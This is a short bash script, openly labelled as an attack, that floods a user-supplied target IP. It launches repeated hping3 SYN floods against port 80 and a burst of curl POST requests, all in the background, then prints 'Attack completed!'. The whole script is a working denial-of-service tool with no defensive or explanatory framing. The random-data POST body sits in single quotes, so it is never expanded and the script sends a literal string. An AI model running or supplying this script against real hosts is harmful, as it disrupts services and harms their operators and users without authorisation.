#!/bin/bash
# Target information
read -p "Target IP: " target_ip
read -p "Number of TCP SYN messages: " syn_msgs
read -p "Number of POST requests: " requests

# Initiate & execute the attack
for ((i=1; i<=syn_msgs; i++)); do
  hping3 -S -p 80 --flood $target_ip > /dev/null 2>&1 &
done
for ((i=1; i<=requests; i++)); do
  curl -X POST -d '$(head -c 10000 </dev/urandom | base64)' http://$target_ip:80 > /dev/null 2>&1 &
done

# Print a message when the attack is finished
echo "Attack completed!"
